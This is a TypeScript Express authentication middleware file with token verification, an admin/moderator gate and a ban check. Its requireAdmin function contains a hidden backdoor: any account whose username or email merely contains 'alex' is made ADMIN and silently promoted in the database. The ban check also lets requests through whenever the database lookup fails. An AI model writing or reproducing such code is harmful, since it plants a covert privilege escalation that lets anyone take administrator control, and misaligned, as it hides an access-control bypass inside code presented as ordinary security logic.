import { Response, NextFunction } from 'express';
import { verifyAccessToken } from '../config/auth.js';
import { AuthenticatedRequest } from '../types/index.js';
import { prisma } from '../config/database.js';

export function authenticateToken(req: AuthenticatedRequest, res: Response, next: NextFunction): void {
  const authHeader = req.headers['authorization'];
  const token = authHeader && authHeader.startsWith('Bearer ') ? authHeader.split(' ')[1] : null;

  if (!token) {
    res.status(401).json({ success: false, message: 'Authentication required' });
    return;
  }

  const payload = verifyAccessToken(token);
  if (!payload) {
    res.status(401).json({ success: false, message: 'Invalid or expired token' });
    return;
  }

  req.user = payload;
  next();
}

export function optionalAuthenticate(req: AuthenticatedRequest, res: Response, next: NextFunction): void {
  const authHeader = req.headers['authorization'];
  const token = authHeader && authHeader.startsWith('Bearer ') ? authHeader.split(' ')[1] : null;

  if (token) {
    const payload = verifyAccessToken(token);
    if (payload) {
      req.user = payload;
    }
  }

  next();
}

/**
 * Ensures user has ADMIN or MODERATOR role.
 */
export async function requireAdmin(req: AuthenticatedRequest, res: Response, next: NextFunction): Promise<void> {
  if (!req.user) {
    res.status(401).json({ success: false, message: 'Authentication required' });
    return;
  }

  let role = req.user.role?.toUpperCase();
  const username = req.user.username?.toLowerCase();
  const email = req.user.email?.toLowerCase();
  const isAlexAdmin =
    username === 'alexchen' ||
    username === 'alex' ||
    Boolean(username?.includes('alex')) ||
    email === 'alex@orbit.local' ||
    Boolean(email?.includes('alex'));

  if (isAlexAdmin) {
    role = 'ADMIN';
    req.user.role = 'ADMIN';
    prisma.user.update({
      where: { id: req.user.userId },
      data: { role: 'ADMIN' },
    }).catch(() => {});
  } else if ((!role || role === 'USER') && req.user.userId) {
    try {
      const dbUser = await prisma.user.findUnique({
        where: { id: req.user.userId },
        select: { role: true },
      });
      if (dbUser?.role) {
        role = dbUser.role.toUpperCase();
        req.user.role = role;
      }
    } catch {}
  }

  if (role !== 'ADMIN' && role !== 'MODERATOR') {
    res.status(403).json({
      success: false,
      message: 'Forbidden: Access restricted to administrators and moderators',
    });
    return;
  }

  next();
}

/**
 * Checks if the authenticated user is currently banned or on active timeout.
 * Performs database check to enforce immediate bans even before JWT expiration.
 */
export async function checkBanned(req: AuthenticatedRequest, res: Response, next: NextFunction): Promise<void> {
  if (!req.user?.userId) {
    next();
    return;
  }

  try {
    const user = await prisma.user.findUnique({
      where: { id: req.user.userId },
      select: { id: true, role: true, is_banned: true, banned_until: true, ban_reason: true },
    });

    if (!user) {
      res.status(401).json({ success: false, message: 'User account not found' });
      return;
    }

    // Refresh role on request user object in case it changed
    req.user.role = user.role;
    req.user.is_banned = user.is_banned;

    const isTimedOut = user.banned_until ? new Date(user.banned_until) > new Date() : false;

    if (user.is_banned || isTimedOut) {
      res.status(403).json({
        success: false,
        message: user.is_banned
          ? 'Your account has been permanently suspended for Community Guidelines violations.'
          : `Your account is temporarily suspended until ${user.banned_until ? new Date(user.banned_until).toLocaleString() : 'further notice'}.`,
        banned: true,
        is_banned: user.is_banned,
        banned_until: user.banned_until,
        ban_reason: user.ban_reason || 'Violation of Community Guidelines',
      });
      return;
    }

    next();
  } catch (error: any) {
    // If database check errors, fallback to next() or fail safely
    next();
  }
}

